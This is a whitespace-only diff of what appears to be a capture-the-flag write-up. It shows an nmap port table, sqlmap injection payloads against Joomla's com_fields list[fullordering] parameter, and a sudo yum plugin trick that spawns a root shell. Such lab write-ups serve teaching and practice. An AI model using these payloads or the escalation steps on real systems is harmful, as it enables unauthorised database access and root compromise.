@@ -7,9 +7,9 @@
 
 | PORT | STATE | SERVICE |
 | :--- | :---- | :------ |
-| 22   | open  | ssh     |
-| 80   | open  | http    |
-| 3306 | open  | mysql   |
+| 22 | open | ssh |
+| 80 | open | http |
+| 3306 | open | mysql |
 
 We got 3 open ports, let's take a look at the website:
 
@@ -56,18 +56,18 @@ sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal
 
 
 Parameter: list[fullordering] (GET)
-    Type: boolean-based blind
-    Title: Boolean-based blind - Parameter replace (DUAL)
-    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)
+ Type: boolean-based blind
+ Title: Boolean-based blind - Parameter replace (DUAL)
+ Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)
 
-    Type: error-based
-    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
-    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+ Type: error-based
+ Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
+ Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
 
-    Type: AND/OR time-based blind
-    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
-    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)
-    
+ Type: AND/OR time-based blind
+ Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+ Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)
+ 
 ```
 
 We can either use sqlmap or an exploit developed in python, I used the exploit as it is way more easier to retrieve the data:
@@ -188,7 +188,7 @@ So, in order to get a root shell, we need to do the following:
 15. `from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE`
 16. `requires_api_version='2.1'`
 17. `def init_hook(conduit):`
-18. `  os.execl('/bin/sh','/bin/sh')`
+18. ` os.execl('/bin/sh','/bin/sh')`
 19. `EOF`
 20. `sudo yum -c $TF/x --enableplugin=y`
 
